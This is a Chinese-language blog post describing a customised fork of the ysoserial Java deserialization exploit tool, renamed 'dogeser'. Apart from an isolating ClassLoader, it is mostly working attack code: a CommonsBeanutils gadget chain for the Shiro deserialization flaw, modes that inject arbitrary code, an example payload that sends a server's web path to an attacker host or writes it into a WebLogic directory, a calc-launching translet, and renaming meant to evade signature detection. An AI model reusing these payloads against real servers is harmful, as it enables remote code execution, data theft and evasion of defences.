#  Ysoserial改造记录



## 自定义 ClassLoader 隔离运行不同版本jar包的方式



### 类加载机制



在 Java 中，所有的类默认通过 ClassLoader 加载，而 Java 默认提供了三层的 ClassLoader，并通过双亲委托模型的原则进行加载，其基本模型与加载位置如下（更多ClassLoader相关原理请自行搜索）：<br />![image-20211122172332343](https://raw.githubusercontent.com/SummerSec/Images/main/summersec//32u23er32ec/32u23er32ec.png)<br />![image-20211122172352427](https://raw.githubusercontent.com/SummerSec/Images/main/summersec//52u23er52ec/52u23er52ec.png)<br />Java 中默认的 ClassLoader 都规定了其指定的加载目录，一般也不会通过 JVM 参数来使其加载自定义的目录，所以我们需要自定义一个 ClassLoader 来加载装有不同版本的 jar 包的扩展目录，同时为了使运行扩展的 jar 包时，与启动项目实现绝对的隔离，我们需要保证他们所加载的类不会有相同的 ClassLoader，根据双亲委托模型的原理可知，我们必须使自定义的 ClassLoader 的 parent 为 null，这样不管是 JRE 自带的 jar 包或一些基础的 Class 都不会委托给 App ClassLoader（当然仅仅是将 Parent 设置为 null 是不够的，后面会说明)。与此同时这些实现了不同版本的 jar 包，是经过二次开发后的可以独立运行的项目。



----



### 实现代码



```java
public class StandardExecutorClassLoader extends URLClassLoader {

    private final static String baseDir = System.getProperty("user.dir") + File.separator + "lib" + File.separator;

    public StandardExecutorClassLoader(String version) {
        // 将 Parent 设置为 null
        super(new URL[] {}, null);

        loadResource(version);
    }

    @Override
    public Class<?> loadClass(String name) throws ClassNotFoundException {
        // 测试时可打印看一下
       // System.out.println("Class loader: " + name);
        return super.loadClass(name);
    }

    @Override
    protected Class<?> findClass(String name) throws ClassNotFoundException {
        try {
            return super.findClass(name);
        } catch(ClassNotFoundException e) {
            return StandardExecutorClassLoader.class.getClassLoader().loadClass(name);
        }
    }

    private void loadResource(String version) {
        String jarPath = baseDir + version;

        // 加载对应版本目录下的 Jar 包
        tryLoadJarInDir(jarPath);
        // 加载对应版本目录下的 lib 目录下的 Jar 包
        tryLoadJarInDir(jarPath + File.separator + "lib");
    }

    private void tryLoadJarInDir(String dirPath) {
        File dir = new File(dirPath);
        // 自动加载目录下的jar包
        if (dir.exists() && dir.isDirectory()) {
            for (File file : dir.listFiles()) {
                if (file.isFile() && file.getName().endsWith(".jar")) {
                    this.addURL(file);
                    continue;
                }
            }
        }
    }

    private void addURL(File file) {
        try {
            super.addURL(new URL("file", null, file.getCanonicalPath()));
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

}

```
![image-20211122172440217](https://raw.githubusercontent.com/SummerSec/Images/main/summersec//40u24er40ec/40u24er40ec.png)<br />

### Shiro反序列化漏洞实现



```java
public class CommonsBeanutils1_192 implements ObjectPayload {
    @Override
    public Object getObject(Object templates) throws Exception {
        StandardExecutorClassLoader classLoader = new StandardExecutorClassLoader("1.9.2");
        Class u = classLoader.loadClass("org.apache.commons.beanutils.BeanComparator");

        Object beanComparator = u.getDeclaredConstructor(String.class).newInstance("lowestSetBit");
        PriorityQueue<Object> queue = new PriorityQueue(2, (Comparator<? super Object>)beanComparator);

        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        Reflections.setFieldValue(beanComparator, "property", "outputProperties");

        Object[] queueArray = (Object[])Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;
        return queue;
    }
}
```





----

## 修改ysoserial使其支持任意代码执行



### 减小payload的体积
根据文章[缩小ysoserial payload体积的几个方法](https://xz.aliyun.com/t/6227)最大程度上减小生成payload的体积，对比结果直接减小一半多。

![image.png](https://raw.githubusercontent.com/SummerSec/Images/main/summersec//55u46er55ec/55u46er55ec.png)<br />


---


### 支持自定义方法，类
参考[ysoserial 工具改造（一）](https://www.yuque.com/tianxiadamutou/zcfd4v/ffd33r)和[使ysoserial支持执行自定义代码](https://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/)方法将生成payload方法进行改造。<br />我这边添加了五种方式

| 序号 | 方式                            | 描述                                                    |
| ---- | ------------------------------- | ------------------------------------------------------- |
| 1    | command                         | 与原版相同                                              |
| 2    | “code:代码内容”                 | 代码量比较少时采用                                      |
| 3    | “codebase64:代码内容base64编码” | 防止代码中存在但引号，双引号，&等字符与控制台命令冲突。 |
| 4    | “codefile:代码文件路径”         | 代码量比较多时采用                                      |
| 5    | “classfile:class路径“           | 利用已生成好的 class 直接获取其字节码                   |

支持下面这些gadget<br />![image.png](https://raw.githubusercontent.com/SummerSec/Images/main/summersec//55u46er55ec/55u46er55ec.png)<br />

<a name="Cl1vV"></a>
#### codebase64、codefile:、code三种命令介绍

<br />三个命令使用方法参考，codefile:是code比较多的时候。
```http
java -jar dogeser-0.0.8-SNAPSHOT-all.jar CommonsBeanutils1 code:calc
```
```http
String HOST = "http://192.168.149.1:1665";
String WEB_PATH = System.getProperty("user.dir");

String str_url = HOST + "/?info=" + WEB_PATH;
try{
    //若目标能访问我们的服务器，则发送信息到服务器上
    java.net.URL url = new java.net.URL(str_url);
    java.net.URLConnection conn = url.openConnection();
    conn.connect();
    conn.getContent();
}catch(Exception e){
    //若目标不能访问我们的服务器，则将信息写到自己的web目录下info.log文件中
    String webPath = WEB_PATH + "/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/info.log";
    try {
        java.io.FileOutputStream f1 = new java.io.FileOutputStream(webPath);
        f1.write(WEB_PATH.getBytes());
        f1.close();
    } catch (Exception e1) {
        e1.printStackTrace();
    }
}
```
```http
java -jar dogeser-0.0.8-SNAPSHOT-all.jar CommonsBeanutils1 codefile:Calc.java
```

<br />[案例](https://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/#0x04-%E6%A1%88%E4%BE%8B)<br />

#### classfile：
类需要继承AbstractTranslet <br />需要区分xalan\xalan\2.7.2\xalan-2.7.2.jar!\org\apache\xalan\xsltc\runtime\AbstractTranslet.class<br />这里需要的是**jdk内置的AbstractTranslet**<br />以弹计算器为例
```java
 java -jar dogeser-0.0.8-SNAPSHOT-all.jar CommonsBeanutils1 classfile:G:\Calc.class>2.ser
```
```java

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

/**
 * @ClassName: Calc
 * @Description: TODO
 * @Author: Summer
 * @Date: 2021/9/10 16:16
 * @Version: v1.0.0
 * @Description:
 **/
public class Calc extends AbstractTranslet {
    public  Calc() {}

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    @Override
    public void transform(DOM dom, SerializationHandler[] serializationHandlers) throws TransletException {

    }

}

```

#### 去掉原版绝大数特征
 原版大量使用ysoserial、Pwer字段，去除后效果。改掉原版package名字换成dogeser，生成的payload的就不会出现ysoserial字段。<br />![image.png](https://raw.githubusercontent.com/SummerSec/Images/main/summersec//55u46er55ec/55u46er55ec.png)<br />





### 参考

[https://blog.csdn.net/t894690230/article/details/73252331](https://blog.csdn.net/t894690230/article/details/73252331)
[https://xz.aliyun.com/t/6227](https://xz.aliyun.com/t/6227)

[https://www.yuque.com/tianxiadamutou/zcfd4v/ffd33r](https://www.yuque.com/tianxiadamutou/zcfd4v/ffd33r)
